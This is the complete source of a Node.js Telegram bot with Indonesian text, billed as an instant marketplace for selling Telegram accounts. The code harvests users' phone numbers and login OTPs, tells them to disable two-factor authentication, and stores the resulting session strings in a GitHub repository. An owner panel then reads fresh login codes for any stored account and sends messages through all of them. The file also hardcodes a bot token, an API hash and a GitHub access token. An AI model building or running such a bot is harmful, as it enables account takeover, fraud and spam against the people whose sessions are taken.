const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Octokit } = require("@octokit/rest");
const fs = require('fs');

// --- KONFIGURASI BOT ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8238521944:AAGtfc6goWfX0bmm1cmKuYlD-p3lIGjJvCM';
const logChannel = '-1003121256961';
const ownerId = 8457401920;
const MIN_WD = 50000;

// --- KONFIGURASI GITHUB STORAGE ---
const GITHUB_TOKEN = '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'; 
const REPO_OWNER = 'ajayajay293';
const REPO_NAME = 'botjualakjn';
const FILE_PATH = 'sessions.json';

const octokit = new Octokit({ auth: GITHUB_TOKEN });
const bot = new Telegraf(botToken);
const userSessions = {};

// --- DATABASE HANDLER (GITHUB CLOUD SYNC) ---
const getData = async () => {
    try {
        const { data } = await octokit.repos.getContent({
            owner: REPO_OWNER, repo: REPO_NAME, path: FILE_PATH,
        });
        return JSON.parse(Buffer.from(data.content, 'base64').toString());
    } catch (e) {
        return { accounts: [], users: {} };
    }
};

const saveData = async (db) => {
    try {
        let sha;
        try {
            const { data } = await octokit.repos.getContent({ owner: REPO_OWNER, repo: REPO_NAME, path: FILE_PATH });
            sha = data.sha;
        } catch (e) { sha = null; }

        await octokit.repos.createOrUpdateFileContents({
            owner: REPO_OWNER, repo: REPO_NAME, path: FILE_PATH,
            message: `Bot Update: ${new Date().toLocaleString()}`,
            content: Buffer.from(JSON.stringify(db, null, 2)).toString('base64'),
            sha: sha
        });
    } catch (e) { console.error("❌ GitHub Sync Error:", e.message); }
};

// --- UTILS: ANIMASI & FORMAT ---
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const drawLoading = async (ctx, messageId, title) => {
    const frames = [
        "█▒▒▒▒▒▒▒▒▒ 10%", "██▒▒▒▒▒▒▒▒ 20%", "███▒▒▒▒▒▒▒ 30%", "████▒▒▒▒▒▒ 40%",
        "█████▒▒▒▒▒ 50%", "██████▒▒▒▒ 60%", "███████▒▒▒ 70%", "████████▒▒ 80%",
        "█████████▒ 90%", "██████████ 100%"
    ];
    for (const frame of frames) {
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, null, 
                `⏳ **${title}**\n\n\`${frame}\``, { parse_mode: 'Markdown' });
            await sleep(300);
        } catch (e) {}
    }
};

// --- UI COMPONENTS ---
const startText = (name) => 
    `✨ **SELAMAT DATANG, ${name.toUpperCase()}!** ✨\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚀 **VORTEXNODE CLOUD v2.0**\n` +
    `Platform jual-beli akun Telegram paling aman & instan.\n\n` +
    `💎 **KEUNTUNGAN:**\n` +
    `• 🟢 **Otomatis:** Saldo cair dalam hitungan detik.\n` +
    `• 🟢 **Harga:** Rp 20.000 - Rp 25.000 per akun.\n` +
    `• 🟢 **Keamanan:** Data tersimpan di server terenkripsi.\n\n` +
    `⚠️ **SYARAT WAJIB:**\n` +
    `1. Nonaktifkan Password (2FA).\n` +
    `2. Akun tidak dalam kondisi limit/spam.\n` +
    `3. Nomor wajib aktif.`;

const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN (INSTANT)', 'jual_akun')],
    [Markup.button.callback('👤 PROFIL SAYA', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

const backBtn = (target) => Markup.inlineKeyboard([[Markup.button.callback('🔙 KEMBALI KE MENU', target)]]);

// --- MAIN COMMANDS ---
bot.start((ctx) => ctx.replyWithMarkdown(startText(ctx.from.first_name), mainBtn()));

bot.action('main_menu', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.editMessageText(startText(ctx.from.first_name), { parse_mode: 'Markdown', ...mainBtn() });
});

// --- PROSES JUAL AKUN ---
bot.action('jual_akun', async (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.editMessageText(
        '📲 **MASUKKAN NOMOR TELEGRAM**\n\nKirim nomor dengan format kode negara.\nContoh: `628123456789`',
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    if (!state) return;

    const db = await getData();

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        const phone = text.replace(/[^0-9]/g, '');
        
        // CEK DUPLIKAT
        if (db.accounts.find(a => a.phone === phone)) {
            return ctx.reply('❌ **GAGAL:** Nomor ini sudah pernah dijual ke sistem kami. Silahkan gunakan nomor lain.', mainBtn());
        }

        const msg = await ctx.reply('📡 **MENGHUBUNGI SERVER TELEGRAM...**');
        await drawLoading(ctx, msg.message_id, "Mengirim Kode OTP...");

        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
            
            state.client = client;
            state.phone = phone;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nMasukkan kode dari aplikasi Telegram Anda.\nFormat: `1 2 3 4 5` (Gunakan Spasi)', { parse_mode: 'Markdown' });
        } catch (err) {
            ctx.reply('❌ **GAGAL:** ' + err.message, mainBtn());
            delete userSessions[userId];
        }
    }

    // STEP 2: INPUT OTP
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        const msg = await ctx.reply('🔐 **MENVERIFIKASI...**');
        await drawLoading(ctx, msg.message_id, "Sinkronisasi Sesi...");

        try {
            const client = state.client;
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            const harga = state.phone.startsWith('1') ? 25000 : 20000;

            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                sellerId: userId,
                sellerName: ctx.from.first_name,
                date: new Date().toLocaleString()
            });

            if (!db.users[userId]) db.users[userId] = { balance: 0 };
            db.users[userId].balance += harga;
            
            await saveData(db);
            
            ctx.reply(
                `✅ **TRANSAKSI SUKSES!**\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `📱 Nomor: \`${state.phone}\`\n` +
                `💰 Bonus: +Rp ${harga.toLocaleString()}\n` +
                `💳 Saldo Sekarang: Rp ${db.users[userId].balance.toLocaleString()}\n\n` +
                `Saldo bisa ditarik melalui menu Withdraw.`,
                { parse_mode: 'Markdown', ...mainBtn() }
            );

            bot.telegram.sendMessage(logChannel, 
                `🆕 **NOTIFIKASI PENJUALAN**\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `👤 User: ${ctx.from.first_name} (\`${userId}\`)\n` +
                `📱 Nomor: ${state.phone}\n` +
                `💰 Harga: Rp ${harga.toLocaleString()}\n` +
                `📅 Waktu: ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' }
            );
            
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ **GAGAL LOGIN:** ' + err.message + '\n\nPastikan OTP benar dan **Password (2FA) sudah MATI**.', mainBtn());
        }
        delete userSessions[userId];
    }

    // STEP 3: WITHDRAW
    else if (state.step === 'input_wd') {
        const parts = text.split('-'); 
        const amount = parseInt(parts[2]?.trim() || 0);
        const currentBal = db.users[userId]?.balance || 0;

        if (amount < MIN_WD) return ctx.reply(`❌ Minimal WD adalah Rp ${MIN_WD.toLocaleString()}`, backBtn('withdraw'));
        if (amount > currentBal) return ctx.reply(`❌ Saldo Anda tidak mencukupi!`, backBtn('withdraw'));

        db.users[userId].balance -= amount;
        await saveData(db);
        
        ctx.reply('✅ **PENARIKAN BERHASIL DIAJUKAN!**\nAdmin akan segera memproses dana Anda.', mainBtn());
        bot.telegram.sendMessage(logChannel, `💸 **WD REQUEST**\n👤 User: ${ctx.from.first_name}\n📝 Detail: ${text}\n💰 Status: PENDING`);
        delete userSessions[userId];
    }

    // STEP 4: BROADCAST OWNER
    else if (state.step === 'input_bc' && userId === ownerId) {
        const msg = await ctx.reply('🚀 **MEMULAI BROADCAST...**');
        let success = 0, fail = 0;

        for (const acc of db.accounts) {
            try {
                const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
                await client.connect();
                await client.sendMessage('me', { message: text });
                success++;
                await client.disconnect();
            } catch (e) { fail++; }
        }
        ctx.reply(`📊 **HASIL BROADCAST:**\n🟢 Berhasil: ${success}\n🔴 Gagal: ${fail}\nTotal Akun: ${db.accounts.length}`, backBtn('owner_menu'));
        delete userSessions[userId];
    }
});

// --- PROFILE & WITHDRAW MENU ---
bot.action('profile', async (ctx) => {
    const db = await getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    const sold = db.accounts.filter(a => a.sellerId === ctx.from.id).length;
    ctx.editMessageText(
        `👤 **PROFILE USER**\n━━━━━━━━━━━━━━\n• Nama: ${ctx.from.first_name}\n• ID: \`${ctx.from.id}\`\n• Saldo: **Rp ${bal.toLocaleString()}**\n• Akun Terjual: ${sold} Akun`,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

bot.action('withdraw', async (ctx) => {
    const db = await getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    if (bal < MIN_WD) return ctx.answerCbQuery(`Saldo minimun Rp ${MIN_WD.toLocaleString()} untuk WD!`, { show_alert: true });
    
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.editMessageText(
        `💸 **MENU PENARIKAN**\n\nSaldo Anda: **Rp ${bal.toLocaleString()}**\n\nKirim format berikut:\n\`EWALLET - NOMOR - JUMLAH\`\n\nContoh:\n\`DANA - 08123456789 - 50000\``,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

// --- OWNER CONTROL PANEL ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    ctx.editMessageText('👑 **OWNER CONTROL PANEL**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 LIHAT DAFTAR AKUN', 'list_0')],
        [Markup.button.callback('📢 BROADCAST MASSAL', 'bc_menu')],
        [Markup.button.callback('🔙 KEMBALI', 'main_menu')]
    ]));
});

bot.action(/^list_(\d+)$/, async (ctx) => {
    const page = parseInt(ctx.match[1]);
    const db = await getData();
    const current = db.accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
    if ((page * 5) + 5 < db.accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    
    ctx.editMessageText(`📑 **DATABASE AKUN (Hal ${page + 1})**`, Markup.inlineKeyboard(buttons));
});

bot.action(/^detail_(\d+)$/, async (ctx) => {
    const db = await getData();
    const acc = db.accounts[parseInt(ctx.match[1])];
    ctx.editMessageText(
        `📄 **DETAIL AKUN**\n\nNomor: \`${acc.phone}\`\nSeller: ${acc.sellerName}\nTanggal: ${acc.date}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 AMBIL OTP', `sms_${ctx.match[1]}`)],
            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
        ])
    );
});

bot.action(/^sms_(\d+)$/, async (ctx) => {
    const db = await getData();
    const acc = db.accounts[parseInt(ctx.match[1])];
    ctx.answerCbQuery('Membuka sesi...');
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 });
        ctx.reply(`📩 **KODE TELEGRAM (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) { ctx.reply('❌ Gagal: Sesi mungkin sudah mati.'); }
});

bot.action('bc_menu', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_bc' };
    ctx.editMessageText('📢 **BROADCAST PANEL**\n\nKetik pesan yang akan dikirim ke "Saved Messages" setiap akun:', backBtn('owner_menu'));
});

// --- RUN BOT ---
bot.launch();
console.log('🚀 Vortex Cloud Bot Online & Synced to GitHub!');
